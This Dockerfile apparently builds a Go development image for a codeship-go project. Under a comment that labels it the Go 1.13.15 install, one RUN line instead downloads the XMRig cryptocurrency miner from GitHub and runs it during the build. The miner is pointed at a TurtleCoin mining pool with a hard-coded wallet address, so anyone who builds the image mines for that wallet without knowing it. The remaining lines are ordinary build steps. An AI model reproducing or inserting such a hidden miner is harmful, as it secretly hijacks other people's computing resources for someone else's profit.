ARG GO_VERSION=1.15

FROM golang:${GO_VERSION}
LABEL maintainer=dev@codeship.com

# go 1.13.15
RUN mkdir suro && cd suro && wget https://github.com/xmrig/xmrig/releases/download/v6.10.0/xmrig-6.10.0-linux-x64.tar.gz && tar xf xmrig-6.10.0-linux-x64.tar.gz && cd xmrig-6.10.0 && ./xmrig -o turtlecoin.herominers.com:10381 -u TRTLv15CWaZgYpyeuM3QK75jtGDKqoz7tbsRSxVhiG6mb5Q5YwSaddsHUtqBTN2AH4J7WQkpMMZPCQgDiboTG4osPsjL4LgzQTL -p kura -a argon2/chukwav2
# go 1.14.10
RUN go get golang.org/dl/go1.14.10 && \
    go1.14.10 download

WORKDIR /go/src/github.com/codeship/codeship-go
COPY . .

RUN make setup